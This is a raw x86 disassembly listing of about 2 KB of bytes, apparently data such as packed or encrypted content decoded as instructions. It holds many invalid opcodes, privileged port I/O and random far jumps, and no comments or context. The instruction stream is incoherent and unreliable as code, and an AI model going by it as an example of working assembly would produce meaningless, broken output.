  4146ed:	lea    esi,[ebx+0xe55f2cc]
  4146f3:	pusha  
  4146f4:	dec    edx
  4146f5:	xchg   ecx,eax
  4146f6:	xchg   ebx,eax
  4146f7:	jnp    0x4146a1
  4146f9:	test   BYTE PTR [edi],al
  4146fb:	repz jbe 0x41475f
  4146fe:	(bad)  
  4146ff:	int    0x29
  414701:	sub    dh,BYTE PTR [ebx-0xc]
  414704:	data16 sahf 
  414706:	xchg   ebp,eax
  414707:	jne    0x41471e
  414709:	sub    DWORD PTR [eax-0x44],edi
  41470c:	add    ebx,eax
  41470e:	nop
  41470f:	loop   0x41478b
  414711:	loopne 0x414738
  414713:	pop    edx
  414714:	mov    esi,0x797ef6b2
  414719:	test   DWORD PTR [edx-0x7e40c378],esi
  41471f:	cdq    
  414720:	psrad  mm2,QWORD PTR [edx+edx*2+0x28004e63]
  414728:	push   0x27
  41472a:	push   edx
  41472b:	es add al,0x96
  41472e:	not    BYTE PTR [ebx-0x6057dbc]
  414734:	xlat   BYTE PTR ds:[ebx]
  414735:	inc    ecx
  414736:	icebp  
  414737:	add    ecx,DWORD PTR [eax+ebp*4-0x71a7c74c]
  41473e:	mov    edi,0x2870607a
  414743:	mov    DWORD PTR [edi-0x3aa21666],0x9c0a87db
  41474d:	push   es
  41474e:	xchg   edi,eax
  41474f:	out    0x70,eax
  414751:	dec    esi
  414752:	mov    cl,0xfe
  414754:	or     eax,0x1adec9db
  414759:	cs or  al,0xf6
  41475c:	cmp    esi,DWORD PTR [ebx-0x2e]
  41475f:	leave  
  414760:	call   0xe96a89f6
  414765:	clc    
  414766:	lds    esp,FWORD PTR [esi-0x4]
  414769:	cmp    dl,al
  41476b:	das    
  41476c:	push   edx
  41476d:	fs call 0x49ad8c86
  414773:	and    BYTE PTR [ecx+0x3b],ch
  414776:	pop    esp
  414777:	mov    edi,0x475f24f9
  41477c:	xor    eax,0xe65f4aba
  414781:	pop    ebx
  414782:	pop    esi
  414783:	add    eax,0x86b8a21b
  414788:	repnz and eax,0xb1407b15
  41478e:	pop    ebx
  41478f:	sbb    al,0xb9
  414791:	adc    ah,BYTE PTR ds:0x8d5aecc9
  414797:	push   esi
  414798:	and    eax,0x20b5896b
  41479d:	or     DWORD PTR [ebp-0x457a3bac],ecx
  4147a3:	xchg   ebx,eax
  4147a4:	ins    BYTE PTR es:[edi],dx
  4147a5:	fild   QWORD PTR [ecx]
  4147a7:	xchg   edi,eax
  4147a8:	rol    DWORD PTR [esi-0x72],cl
  4147ab:	out    0x74,eax
  4147ad:	cwde   
  4147ae:	imul   ecx,DWORD PTR [ebx],0xd49e7f5e
  4147b4:	nop
  4147b5:	hlt    
  4147b6:	push   ds
  4147b7:	jmp    0xb934ceb1
  4147bc:	jbe    0x4147db
  4147be:	das    
  4147bf:	loope  0x4147df
  4147c1:	inc    ebp
  4147c2:	mov    al,0x9f
  4147c4:	sbb    al,0x55
  4147c6:	fdivr  QWORD PTR [edx]
  4147c8:	push   ebp
  4147c9:	bound  esi,QWORD PTR [ecx]
  4147cb:	mov    ebx,0xfe8acc2e
  4147d0:	arpl   dx,bp
  4147d2:	add    ecx,DWORD PTR [ebp*4+0x20048ad2]
  4147d9:	mov    bh,0x68
  4147db:	mov    bl,0x96
  4147dd:	mov    bh,0x80
  4147df:	fcomp  DWORD PTR [eax+0x63]
  4147e2:	or     BYTE PTR [ebp+ebx*1-0x4700b8f8],0x3f
  4147ea:	popa   
  4147eb:	push   esi
  4147ec:	dec    BYTE PTR [ecx+eax*8-0x5a]
  4147f0:	or     BYTE PTR [edi-0x5cae0b04],dh
  4147f6:	fist   WORD PTR [ebx+0x1b]
  4147f9:	inc    edx
  4147fa:	in     eax,0xef
  4147fc:	and    dl,dh
  4147fe:	xchg   esi,eax
  4147ff:	mov    ah,0xae
  414801:	xor    BYTE PTR [eax+0x60],bh
  414804:	sar    dh,0x25
  414807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414808:	js     0x414887
  41480a:	daa    
  41480b:	xor    esp,esi
  41480d:	imul   esp,DWORD PTR [edi],0xec95611a
  414813:	jg     0x41481c
  414815:	add    BYTE PTR [edx+0x6fa97837],0x3
  41481c:	xor    ah,bl
  41481e:	(bad)  
  41481f:	stc    
  414820:	xchg   DWORD PTR [edi-0x58],esi
  414823:	cmp    eax,0x4d18a0e2
  414828:	xlat   BYTE PTR ds:[ebx]
  414829:	mov    esp,0xec81638d
  41482e:	mov    dh,0x36
  414830:	int    0xd6
  414832:	mov    al,0x65
  414834:	jo     0x414851
  414836:	mov    dl,0x32
  414838:	int3   
  414839:	push   eax
  41483a:	inc    ebx
  41483c:	xor    ah,BYTE PTR cs:[edx]
  41483f:	cli    
  414840:	and    edx,edx
  414842:	xchg   ebx,eax
  414843:	gs jecxz 0x41484b
  414846:	xor    ah,BYTE PTR [esi+0xd40ff5f]
  41484c:	cmp    ah,BYTE PTR [edx-0x47213dd]
  414852:	inc    esi
  414853:	mov    esi,0xe0c16557
  414858:	adc    ch,cl
  41485a:	lock rcr BYTE PTR [ebx+ecx*2-0x2a],1
  41485f:	inc    esi
  414860:	mov    edi,0xb6cc532c
  414865:	mov    al,ds:0xa6e3cae9
  41486a:	and    DWORD PTR [eax],ecx
  41486c:	not    BYTE PTR [ebx+esi*8-0x15]
  414870:	leave  
  414871:	loop   0x414822
  414873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414874:	(bad)  
  414875:	adc    BYTE PTR [esp+edi*4],dh
  414878:	xchg   edi,eax
  414879:	dec    esi
  41487a:	xor    al,0xfa
  41487c:	push   cs
  41487d:	adc    ebp,esi
  41487f:	inc    eax
  414880:	jae    0x4148a5
  414882:	sbb    ecx,esi
  414884:	test   edx,edi
  414886:	push   eax
  414887:	(bad)  
  414888:	mov    edi,0x48fcc88c
  41488d:	shr    DWORD PTR [edx],1
  41488f:	and    eax,0x8fa7e0d2
  414894:	lea    eax,[ebx+0xd]
  414897:	pop    esi
  414898:	cmc    
  414899:	adc    al,0xc9
  41489b:	xor    DWORD PTR [ebx+0x61b6c7df],0x68f3fe33
  4148a5:	cmp    eax,esp
  4148a7:	addr16 jae 0x414885
  4148aa:	ficomp WORD PTR [esi-0x33dba3fe]
  4148b0:	mov    esi,0x38fa4b16
  4148b5:	push   ebp
  4148b6:	mov    BYTE PTR [esi+eiz*2],dh
  4148b9:	inc    eax
  4148ba:	pop    edi
  4148bb:	mov    ds:0xe8f39ef2,al
  4148c0:	sub    dh,BYTE PTR ds:0x27c05283
  4148c6:	sti    
  4148c7:	fldcw  WORD PTR [ebp-0x39b71464]
  4148cd:	inc    DWORD PTR [esi+0x1ccabe6]
  4148d3:	push   0x40
  4148d5:	or     eax,0x5ac76010
  4148da:	inc    esi
  4148db:	inc    BYTE PTR [edx+0x3e83a7a3]
  4148e1:	rcr    DWORD PTR [edi],1
  4148e3:	inc    ebx
  4148e4:	sbb    BYTE PTR [ecx+0x59],cl
  4148e7:	fucomip st,st(1)
  4148e9:	call   0xebe1:0x11ae613
  4148f0:	push   ebp
  4148f1:	push   ebp
  4148f2:	cmp    al,0x78
  4148f4:	dec    edi
  4148f5:	ret    0x37d
  4148f8:	push   esp
  4148f9:	shl    edx,cl
  4148fb:	mov    ds:0xf3c5d28f,eax
  414900:	pop    ebp
  414901:	inc    edx
  414902:	out    dx,al
  414903:	xchg   ebx,esp
  414905:	rcr    dl,0x71
  414908:	aaa    
  414909:	mov    dh,dl
  41490b:	pusha  
  41490c:	or     al,0xd7
  41490e:	dec    ecx
  41490f:	jecxz  0x414924
  414911:	and    ebp,DWORD PTR [ebx]
  414913:	imul   ebx,DWORD PTR [eax],0x48
  414916:	or     eax,0x414b9d96
  41491b:	adc    cl,al
  41491d:	loopne 0x4148ba
  41491f:	test   eax,edi
  414921:	xor    ebp,ebx
  414923:	call   0xddc4cb9f
  414928:	cdq    
  414929:	inc    esp
  41492a:	jno    0x4148c1
  41492c:	or     al,0xe0
  41492e:	jp     0x4148b4
  414930:	outs   dx,DWORD PTR ds:[esi]
  414931:	lods   al,BYTE PTR ds:[esi]
  414932:	mov    eax,ds:0xa3323009
  414937:	cmp    edi,DWORD PTR [ebx+0xf904dcb]
  41493d:	mov    ecx,DWORD PTR ds:0xc597c38f
  414943:	dec    ecx
  414944:	aam    0x1c
  414946:	xchg   esi,eax
  414947:	adc    ebx,DWORD PTR [edx]
  414949:	arpl   WORD PTR [ecx+edi*2+0x9],di
  41494d:	std    
  41494e:	fcmovu st,st(3)
  414950:	push   ds
  414951:	or     ebp,DWORD PTR [esi+0x3c10614a]
  414957:	sets   BYTE PTR [ebx+0x5e4b1f9b]
  41495e:	sub    al,dh
  414960:	aas    
  414961:	sub    al,0x56
  414963:	fidivr WORD PTR [ecx+0x40146848]
  414969:	cmp    BYTE PTR [ebx-0x78],bl
  41496c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41496d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496e:	(bad)  
  41496f:	lea    ebp,[edi-0x6d]
  414972:	ins    DWORD PTR es:[edi],dx
  414973:	mov    eax,gs
  414975:	sub    BYTE PTR [ebp-0x73],0xaf
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	and    DWORD PTR [ecx+ecx*1+0x10],0x17
  41497f:	cmp    ch,dl
  414981:	dec    eax
  414982:	int    0xd3
  414984:	inc    ecx
  414985:	stos   BYTE PTR es:[edi],al
  414986:	stc    
  414987:	jmp    0xc790:0x30d8ed7e
  41498e:	clc    
  41498f:	mov    al,ds:0x6c4da49d
  414994:	cmp    al,0xfa
  414996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414997:	xchg   ebx,eax
  414998:	ins    DWORD PTR es:[edi],dx
  414999:	dec    edi
  41499a:	test   eax,0x76e1b522
  41499f:	das    
  4149a0:	and    eax,0x2e1ea199
  4149a5:	icebp  
  4149a6:	pusha  
  4149a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149a8:	mov    ebx,0xf699636d
  4149ad:	and    eax,0x8fd5b9a2
  4149b2:	xchg   esp,eax
  4149b3:	jmp    0xde92d214
  4149b8:	fisubr WORD PTR [edi+ebp*8]
  4149bb:	pop    esi
  4149bc:	in     al,dx
  4149bd:	leave  
  4149be:	push   esi
  4149c0:	je     0x41495e
  4149c2:	scas   eax,DWORD PTR es:[edi]
  4149c3:	push   es
  4149c4:	sub    DWORD PTR [ebx],ebx
  4149c6:	mov    esp,0xc170e130
  4149cb:	sbb    DWORD PTR [edx],eax
  4149cd:	adc    eax,0xdf3bdbde
  4149d2:	lock iret 
  4149d4:	xor    cl,al
  4149d6:	ins    BYTE PTR es:[edi],dx
  4149d7:	sub    ch,BYTE PTR [esi+0x398fa131]
  4149dd:	mov    edx,DWORD PTR [edx+edx*8+0x650c9d54]
  4149e4:	mov    cl,0x50
  4149e6:	dec    esp
  4149e7:	pop    es
  4149e8:	out    dx,eax
  4149e9:	jb     0x4149a1
  4149eb:	cmp    ecx,eax
  4149ed:	push   edi
  4149ee:	inc    ebp
  4149ef:	hlt    
  4149f0:	(bad)  
  4149f1:	sbb    eax,0x32a02eff
  4149f6:	ins    DWORD PTR es:[edi],dx
  4149f7:	repz cs dec ecx
  4149fa:	sub    eax,0x1b3e3762
  4149ff:	xchg   ebx,eax
  414a00:	jmp    0xd3757569
  414a05:	mov    esp,0xac2aaa90
  414a0a:	xchg   ecx,eax
  414a0b:	or     eax,0x90e8ba13
  414a10:	push   cs
  414a11:	stc    
  414a12:	inc    esi
  414a13:	ja     0x414a7c
  414a15:	imul   ebx,DWORD PTR [ebp-0x432759c5],0xbedcb654
  414a1f:	mov    DWORD PTR [ebp+0x7570ab3e],esp
  414a25:	push   0x37b47429
  414a2a:	stc    
  414a2b:	nop
  414a2c:	lds    ebp,FWORD PTR [esi+0x3a]
  414a2f:	and    bh,BYTE PTR [ecx+0x2f]
  414a32:	mov    esp,0x8ccfbc45
  414a37:	in     al,0xb5
  414a39:	aaa    
  414a3a:	call   DWORD PTR [edi+0x6b]
  414a3d:	sbb    BYTE PTR [eax],dl
  414a3f:	push   edx
  414a40:	push   eax
  414a41:	nop
  414a42:	fmul   DWORD PTR [ecx-0x76671ca0]
  414a48:	loop   0x414a16
  414a4a:	fcomi  st,st(6)
  414a4c:	or     DWORD PTR [ebx+0x72acd92],eax
  414a52:	mov    dh,0x70
  414a54:	retf   0xe53f
  414a57:	imul   bp,WORD PTR [eax+0x23],0xffa1
  414a5c:	out    0x42,al
  414a5e:	inc    eax
  414a5f:	repz inc edi
  414a61:	rcl    esp,1
  414a63:	fwait
  414a64:	cmp    ebx,DWORD PTR [ebx+0x1399856f]
  414a6a:	sub    cl,BYTE PTR [ebp-0x3e519538]
  414a70:	fist   WORD PTR [ecx+0x6de28ec6]
  414a76:	mov    al,0x62
  414a78:	ins    DWORD PTR es:[edi],dx
  414a79:	sub    cl,BYTE PTR [ecx-0x6f]
  414a7c:	enter  0xc2db,0x0
  414a80:	dec    ebx
  414a81:	xor    ecx,edi
  414a83:	cld    
  414a84:	js     0x414a35
  414a86:	sub    eax,0x1dfaeac4
  414a8b:	add    ah,BYTE PTR [edi+0x789428f]
  414a91:	popa   
  414a92:	xchg   edx,eax
  414a93:	ins    DWORD PTR es:[edi],dx
  414a94:	dec    edi
  414a95:	inc    eax
  414a96:	xchg   BYTE PTR [ebx+0x29],bl
  414a99:	inc    edx
  414a9a:	ficomp DWORD PTR es:[ebp+0x7dcab84]
  414aa1:	mov    ah,0xcd
  414aa3:	ja     0x414a66
  414aa5:	xor    BYTE PTR [ebp-0x1ea21189],bl
  414aab:	add    eax,0x5efb685b
  414ab0:	not    BYTE PTR ds:0x3fa7f22b
  414ab6:	jg     0x414abc
  414ab8:	mov    esp,0x7b9e6945
  414abd:	add    ebx,DWORD PTR [edi-0x1f400d3f]
  414ac3:	adc    BYTE PTR [edi-0x3],bl
  414ac6:	push   esp
  414ac7:	mov    ds,WORD PTR [eax]
  414ac9:	ins    DWORD PTR es:[edi],dx
  414aca:	and    eax,DWORD PTR [ebp+0x10]
  414acd:	and    al,0x9e
  414acf:	push   ecx
  414ad0:	cmp    eax,0xfe5930f6
  414ad5:	jp     0x414b38
  414ad7:	jb     0x414b27
  414ad9:	push   eax
  414ada:	imul   BYTE PTR [ebx]
  414adc:	push   cs
  414add:	add    edi,DWORD PTR [esi+0x5a41df92]
  414ae3:	fwait
  414ae4:	mov    ecx,edx
  414ae6:	push   ss
  414ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae8:	ja     0x414b11
  414aea:	(bad)  
  414aec:	(bad)  
  414aed:	dec    ecx
  414aee:	pop    edi
  414aef:	jmp    0x414af9
  414af1:	loopne 0x414b1c
  414af3:	pop    esp
  414af4:	sbb    BYTE PTR [ecx+0x77],0x32
  414af8:	inc    edi
  414af9:	ja     0x414b6b
  414afb:	sti    
  414afc:	mov    edi,0xacbd8baf
  414b01:	test   BYTE PTR ds:[edi+ecx*4],ch
  414b05:	aaa    
  414b06:	cmp    al,0x18
  414b08:	add    BYTE PTR [ecx],dh
  414b0a:	xchg   bh,ch
  414b0c:	push   ebp
  414b0d:	aaa    
  414b0e:	xlat   BYTE PTR ds:[ebx]
  414b0f:	jmp    0x414a92
  414b11:	inc    ebx
  414b12:	loope  0x414b61
  414b14:	mov    al,ds:0xbba28cb6
  414b19:	stc    
  414b1a:	xor    eax,0xfaa78be3
  414b1f:	iret   
  414b20:	leave  
  414b21:	jge    0x414ba1
  414b23:	sub    al,bl
  414b25:	pop    ss
  414b26:	mov    cl,0xd7
  414b29:	cmp    DWORD PTR [bx-0x8],ebx
  414b2d:	pop    edx
  414b2e:	pop    ebx
  414b2f:	outs   dx,DWORD PTR ds:[esi]
  414b30:	shl    DWORD PTR [ebx+ebp*1-0x2bc7f2a6],1
  414b37:	or     ch,BYTE PTR [esi]
  414b39:	test   eax,eax
  414b3b:	mov    ch,0xc6
  414b3d:	jp     0x414b43
  414b3f:	lods   eax,DWORD PTR ds:[esi]
  414b40:	pop    ecx
  414b41:	sub    al,0x81
  414b43:	inc    ebp
  414b44:	clc    
  414b45:	inc    eax
  414b46:	pop    ebp
  414b47:	pop    ss
  414b48:	in     al,dx
  414b49:	inc    eax
  414b4a:	dec    edi
  414b4b:	jne    0x414b5b
  414b4d:	jae    0x414b37
  414b4f:	inc    ebp
  414b50:	jb     0x414bc2
  414b52:	inc    edi
  414b53:	out    dx,eax
  414b54:	sti    
  414b55:	es mov edi,0x1fd2dc6e
  414b5b:	add    eax,0x38b765a9
  414b60:	mov    edi,0xb73ca554
  414b65:	jg     0x414b4f
  414b67:	aas    
  414b68:	jo     0x414b6d
  414b6a:	push   ss
  414b6b:	xor    edi,esi
  414b6d:	into   
  414b6e:	pop    esp
  414b6f:	or     cl,BYTE PTR [eax+0x5174377]
  414b75:	popf   
  414b76:	inc    edi
  414b77:	scas   al,BYTE PTR es:[edi]
  414b78:	test   al,0xf2
  414b7b:	xlat   BYTE PTR ds:[ebx]
  414b7c:	sbb    DWORD PTR [esi-0x42951bc8],edx
  414b82:	daa    
  414b83:	or     esp,DWORD PTR [ebp+0x14]
  414b86:	outs   dx,BYTE PTR ds:[esi]
  414b87:	aas    
  414b88:	(bad)  
  414b89:	jmp    0x91d58ba9
  414b8e:	in     eax,dx
  414b8f:	scas   al,BYTE PTR es:[edi]
  414b90:	inc    esi
  414b91:	xchg   ebp,eax
  414b92:	cmovl  edi,DWORD PTR [edi]
  414b95:	pop    ebx
  414b96:	xor    BYTE PTR [edx-0x76],dh
  414b99:	push   es
  414b9a:	jb     0xdef21ffa
  414ba0:	js     0x414b65
  414ba2:	inc    eax
  414ba3:	fdivr  st(4),st
  414ba5:	aas    
  414ba6:	(bad)  
  414ba8:	sbb    ebx,ebx
  414baa:	push   ecx
  414bab:	push   es
  414bac:	out    0x74,al
  414bae:	fld    QWORD PTR [esi-0x2]
  414bb1:	xchg   ebx,eax
  414bb2:	mov    dl,0xaf
  414bb4:	daa    
  414bb5:	mov    edx,0xdd9fb8ca
  414bba:	push   esp
  414bbb:	out    dx,al
  414bbc:	stos   BYTE PTR es:[edi],al
  414bbd:	cmp    BYTE PTR [eax+edi*8],dl
  414bc0:	in     eax,0x5
  414bc2:	or     eax,0xac5998ff
  414bc7:	dec    edi
  414bc8:	pop    edx
  414bc9:	fdiv   QWORD PTR [ecx-0x1c]
  414bcc:	inc    edx
  414bcd:	xor    eax,0x275ebd7
  414bd2:	and    BYTE PTR [esi],0x55
  414bd5:	sub    BYTE PTR ds:0xadfc3855,bh
  414bdb:	call   0x60a59a4b
  414be0:	mov    eax,ds:0xf0b48f54
  414be5:	call   0x762e:0xdcb6b8a1
  414bec:	jge    0x414c5d
  414bee:	addr16 enter 0x2229,0x3a
  414bf3:	ret    
  414bf4:	ret    0x4b47
  414bf7:	sbb    BYTE PTR [ebx],ch
  414bf9:	mov    edx,0x6318c1cb
  414bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bff:	sbb    BYTE PTR fs:[ebx+0x7a],ch
  414c03:	and    al,0xd3
  414c05:	xor    ebp,DWORD PTR [edi]
  414c07:	sbb    eax,0x6e69e59e
  414c0c:	call   0x28aa:0xabcd5d0b
  414c13:	inc    edi
  414c14:	ret    
  414c15:	sbb    al,0x81
  414c17:	fidivr DWORD PTR [edi+0x30]
  414c1a:	xchg   esp,eax
  414c1b:	cs sahf 
  414c1d:	ja     0x414c12
  414c1f:	sub    bl,0x6c
  414c22:	scas   al,BYTE PTR es:[edi]
  414c23:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  414c25:	push   ecx
  414c26:	jecxz  0x414c10
  414c28:	or     DWORD PTR [edx-0x48],edi
  414c2b:	push   eax
  414c2c:	shr    DWORD PTR [edi+edx*2+0x1c],1
  414c30:	xor    bh,bl
  414c32:	push   esp
  414c33:	scas   al,BYTE PTR es:[edi]
  414c34:	dec    ebx
  414c35:	add    esi,DWORD PTR [esi+eiz*8+0x6c4b12f6]
  414c3c:	jnp    0x414cae
  414c3e:	in     eax,dx
  414c3f:	rcr    DWORD PTR [ecx],0xe5
  414c42:	sub    esp,DWORD PTR [eax+0x59]
  414c45:	popa   
  414c46:	pop    esi
  414c47:	mov    ch,0x2d
  414c49:	and    al,BYTE PTR [ebx]
  414c4b:	push   esi
  414c4c:	jmp    0x7b42:0xebe33549
  414c53:	push   edi
  414c54:	dec    eax
  414c55:	out    0xec,eax
  414c57:	retf   
  414c58:	cmp    eax,0x9fd907e7
  414c5d:	adc    eax,0xb21fa946
  414c62:	jle    0x414c13
  414c64:	int3   
  414c65:	lods   eax,DWORD PTR ds:[esi]
  414c66:	push   edi
  414c67:	push   0xe6dec759
  414c6c:	mov    BYTE PTR [eax-0x38e93121],ch
  414c72:	push   ds
  414c73:	pop    ds
  414c74:	inc    DWORD PTR [ecx-0x3b]
  414c77:	adc    BYTE PTR [ecx],ah
  414c79:	jge    0x414c56
  414c7b:	pop    edx
  414c7c:	pop    esp
  414c7d:	cmp    al,0x57
  414c7f:	repnz or al,0x63
  414c82:	jmp    0x58987a0f
  414c87:	bound  edx,QWORD PTR ds:0x9233e58c
  414c8d:	hlt    
  414c8e:	les    esi,FWORD PTR [eax-0x535662ea]
  414c94:	push   cs
  414c95:	dec    ecx
  414c96:	dec    eax
  414c97:	jae    0x414c92
  414c99:	loope  0x414c3c
  414c9b:	idiv   DWORD PTR ds:0xb4e75ba8
  414ca1:	rcr    dh,cl
  414ca3:	xchg   ecx,eax
  414ca4:	neg    DWORD PTR [edi+0x5c]
  414ca7:	stos   BYTE PTR es:[edi],al
  414ca8:	ins    DWORD PTR es:[edi],dx
  414ca9:	jmp    0xba79:0x38c45957
  414cb0:	sbb    ebp,DWORD PTR ds:0x6cdea102
  414cb6:	mov    ds:0xddcdd937,eax
  414cbb:	or     DWORD PTR [ebx-0x4],edi
  414cbe:	dec    edx
  414cbf:	cli    
  414cc0:	add    DWORD PTR [esi+esi*4],0x4c8e3a69
  414cc7:	sbb    bl,BYTE PTR [edi+0x101865ff]
  414ccd:	push   ebx
  414cce:	inc    ecx
  414ccf:	inc    eax
  414cd0:	repz leave 
  414cd2:	ins    DWORD PTR es:[edi],dx
  414cd3:	loop   0x414c5e
  414cd5:	mov    ebp,DWORD PTR [edi+edx*8-0x1e]
  414cd9:	xlat   BYTE PTR ds:[ebx]
  414cda:	jo     0x414d51
  414cdc:	scas   al,BYTE PTR es:[edi]
  414cdd:	xor    ebx,DWORD PTR [ebx]
  414cdf:	cli    
  414ce0:	lock mov ecx,DWORD PTR fs:[edx-0x51]
  414ce5:	je     0x414c7a
  414ce7:	cmp    dh,BYTE PTR [ebx]
  414ce9:	scas   al,BYTE PTR es:[edi]
  414cea:	data16 stos BYTE PTR es:[edi],al
  414cec:	sbb    BYTE PTR [esi+0x3949aaf5],cl
  414cf2:	xor    bl,BYTE PTR [edx+0x3e]
  414cf5:	outs   dx,DWORD PTR ds:[esi]
  414cf6:	imul   ebp,DWORD PTR [ecx-0x61],0xffffffa5
  414cfa:	enter  0x1e37,0x50
  414cfe:	repnz test eax,0xcce80cee
  414d04:	and    eax,0xde39c692
  414d09:	repnz dec edi
  414d0b:	sub    ah,cl
  414d0d:	hlt    
  414d0e:	mov    ds:0xd5cc9df2,al
  414d13:	sti    
  414d14:	adc    bl,BYTE PTR gs:[esi+0x6e]
  414d18:	and    bl,bh
  414d1a:	fnsave [esi-0x5101ee21]
  414d20:	xchg   edx,eax
  414d21:	div    BYTE PTR [esi-0x580a8b37]
  414d27:	loope  0x414d7a
  414d29:	jmp    0x8abaa72e
  414d2e:	mov    al,0x88
  414d30:	mov    WORD PTR [ebx-0x36],cs
  414d33:	mov    edi,0xd9268825
  414d38:	dec    edi
  414d39:	ror    BYTE PTR [ebp+0x15809c23],0x99
  414d40:	cli    
  414d41:	stc    
  414d42:	xchg   ecx,eax
  414d43:	bound  ebp,QWORD PTR [edi+ebx*8]
  414d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d47:	inc    edi
  414d48:	std    
  414d49:	push   cs
  414d4a:	out    0xa2,eax
  414d4c:	add    bh,BYTE PTR [esp+ebx*2]
  414d4f:	jg     0x414d35
  414d51:	xchg   edx,eax
  414d52:	inc    ebx
  414d53:	ret    0xe75e
  414d56:	push   ds
  414d57:	cmp    bl,BYTE PTR [eax+0x37]
  414d5a:	repz rol DWORD PTR [edi+edi*4+0x27e5e69b],0x6e
  414d63:	sbb    edi,edx
  414d65:	jp     0x414d5e
  414d67:	sbb    al,0xb6
  414d69:	xor    ebp,eax
  414d6b:	inc    ebx
  414d6d:	push   esp
  414d6e:	rcr    al,cl
  414d70:	ss aaa 
  414d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d73:	cmp    DWORD PTR [ebx+eiz*1-0x70],edx
  414d77:	sbb    al,0x35
  414d79:	ins    BYTE PTR es:[edi],dx
  414d7a:	cld    
  414d7b:	fsubp  st(3),st
  414d7d:	call   0x6ee:0x4d01e98f
  414d84:	ret    0xb7cf
  414d87:	imul   ecx,DWORD PTR [edi],0x35de7d1f
  414d8d:	and    ah,cl
  414d8f:	cwde   
  414d90:	loop   0x414e02
  414d92:	frstor [edi]
  414d94:	cmp    WORD PTR [eax],sp
  414d97:	inc    eax
  414d98:	xchg   ebx,eax
  414d99:	scas   eax,DWORD PTR es:[edi]
  414d9a:	mov    al,0x3f
  414d9c:	jmp    0x414de4
  414d9e:	icebp  
  414d9f:	outs   dx,BYTE PTR ds:[esi]
  414da0:	xor    edx,DWORD PTR [edx-0x695e7075]
  414da6:	not    DWORD PTR [eax+0x26]
  414da9:	loopne 0x414d70
  414dab:	sub    al,bl
  414dad:	repz or edi,DWORD PTR [eax+ebx*2+0x66]
  414db2:	loopne 0x414e12
  414db4:	dec    esp
  414db5:	(bad)  [eax+0x55]
  414db8:	add    BYTE PTR ds:[edi-0x2a],al
  414dbc:	mov    eax,0x1a30e2e8
  414dc1:	pusha  
  414dc2:	push   0x39
  414dc4:	pop    esp
  414dc5:	mov    cl,0xa5
  414dc7:	inc    ebp
  414dc8:	lea    ebx,[ecx+0x45]
  414dcb:	pop    ss
  414dcc:	add    edx,DWORD PTR [edi+0x33]
  414dcf:	cmp    ebx,DWORD PTR [ebp+ebp*8+0x21]
  414dd3:	xor    ebx,eax
  414dd5:	sti    
  414dd6:	add    ch,cl
  414dd8:	add    bh,al
  414dda:	adc    bl,BYTE PTR [edx-0x2]
  414ddd:	fwait
  414dde:	add    ch,BYTE PTR [eax-0x7ab05cc]
  414de4:	sbb    BYTE PTR [eax+0x2a],dh
  414de7:	cmp    eax,0x6fa4763a
  414dec:	shr    BYTE PTR [esi+edx*8],1
  414def:	dec    ecx
  414df0:	xor    DWORD PTR [ecx],ecx
  414df2:	mov    ebp,0xac9413ab
  414df7:	add    al,0xec
  414df9:	add    al,0x90
  414dfb:	mov    ch,0xc7
  414dfd:	push   es
  414dfe:	mov    ah,0x14
  414e00:	mov    ds:0xfa0e13ba,eax
  414e05:	xor    edi,esi
  414e07:	xchg   DWORD PTR ds:[eax],ebx
  414e0a:	scas   eax,DWORD PTR es:[edi]
  414e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0c:	jecxz  0x414e2d
  414e0e:	ret    
  414e0f:	push   eax
  414e10:	pop    ds
  414e11:	dec    ecx
  414e12:	jl     0x414e57
  414e14:	mov    edx,0x9d5e0724
  414e19:	or     al,0x78
  414e1b:	jb     0x414e7c
  414e1d:	lods   al,BYTE PTR ds:[esi]
  414e1e:	adc    eax,0xc3262bfd
  414e23:	loope  0x414e2c
  414e25:	(bad)  
  414e27:	jmp    0x414e9a
  414e29:	jb     0x414dcf
  414e2b:	push   ebp
  414e2c:	int3   
  414e2d:	cmc    
  414e2e:	or     ch,dl
  414e30:	mov    eax,ds:0xe667cd0b
  414e35:	jmp    0x5786:0x57f5ce2f
  414e3c:	imul   ebx,DWORD PTR [edi+ecx*8+0x7f8c5aa1],0xe3040296
  414e47:	iret   
  414e48:	pop    esp
  414e49:	test   al,0xca
  414e4b:	in     eax,dx
  414e4c:	cmp    ebx,DWORD PTR [edi+0x7501fb69]
  414e52:	dec    edi
  414e53:	(bad)  
  414e56:	pop    ds
  414e57:	test   al,0xe7
  414e59:	mov    ds:0x760ffabc,al
  414e5e:	pop    ecx
  414e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e60:	js     0x414e75
  414e62:	lods   al,BYTE PTR ds:[esi]
  414e63:	push   0xffffffe8
  414e65:	repz es mov bl,ah
  414e69:	mov    edx,DWORD PTR ds:0x64abfadc
  414e6f:	sbb    bh,BYTE PTR [edx]
  414e71:	push   es
  414e72:	sub    BYTE PTR [ecx-0x4c],ch
  414e75:	xor    DWORD PTR [esi+0x4ffc37],esi
  414e7b:	fs imul edi,ecx,0x53
  414e7f:	retf   0x7956
  414e82:	jle    0x414ebb
  414e84:	ja     0x414ef4
  414e86:	sub    eax,0x926ba064
  414e8b:	fimul  WORD PTR [ebx+0x2e1c26b2]
  414e91:	arpl   WORD PTR [edx+0x27671090],di
  414e97:	fwait
  414e98:	stos   BYTE PTR es:[edi],al
  414e99:	(bad)
  414e9c:	dec    ebx
  414e9d:	fmul   QWORD PTR [edx+0x57]
  414ea0:	xchg   edx,eax
  414ea1:	add    bl,BYTE PTR [eax-0x7b226c9]
  414ea7:	cmp    eax,0xc829c780
  414eac:	sbb    bh,BYTE PTR ds:0x3623576
  414eb2:	cmp    ecx,DWORD PTR [ebx-0x2e]
  414eb5:	sub    eax,0x3155cbf3
